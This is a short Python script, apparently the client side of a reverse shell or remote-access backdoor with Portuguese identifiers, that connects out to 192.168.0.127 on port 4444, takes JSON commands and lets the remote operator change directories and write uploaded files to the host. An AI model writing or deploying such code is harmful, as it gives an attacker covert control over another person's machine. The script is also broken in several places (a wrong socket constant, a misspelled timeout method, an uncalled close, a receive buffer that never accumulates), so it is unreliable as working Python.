import socket
import json
import subprocess
import os
import pyautogui


def dados_rec():
    dados  = ''
    while True:
        try:
            data = dados + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file):
    f = open(file, 'wb')
    sock.setTimeout(3)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.setTimeout(None)
    f.close

def shell():
    while True:
        comando_foda = dados_rec()
        if comando_foda == 'exit':
            break
        elif comando_foda == 'clear':
            pass
        elif comando_foda [:3] == 'cd ':
            os.chdir(comando_foda[3:])
        elif comando_foda [:6] == 'upload':
            download_file(comando_foda[7:])

sock = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
sock.connect(("192.168.0.127", 4444))
shell ()
